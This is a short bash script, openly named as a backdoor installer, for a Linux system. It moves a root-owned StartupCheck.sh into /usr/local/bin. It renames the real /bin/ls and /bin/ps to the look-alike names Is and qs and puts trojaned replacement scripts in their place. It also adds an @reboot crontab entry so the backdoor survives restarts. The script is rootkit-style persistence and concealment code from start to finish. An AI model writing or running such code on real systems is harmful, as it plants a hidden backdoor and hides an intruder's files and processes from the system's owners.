#!/bin/bash

BACKDOOR_SCRIPT_LOCATION="/usr/local/bin/"

chmod 700 StartupCheck.sh
chmod +x new_ls.sh
chmod +x new_ps.sh
chown root StartupCheck.sh
chown root new_ls.sh
chown root new_ps.sh

mv StartupCheck.sh "${BACKDOOR_SCRIPT_LOCATION}"
mv /bin/ls /bin/Is
mv /bin/ps /bin/qs
mv new_ls.sh /bin/ls
mv new_ps.sh /bin/ps

crontab -l | { cat; echo "@reboot ${BACKDOOR_SCRIPT_LOCATION}StartupCheck.sh &"; } | crontab -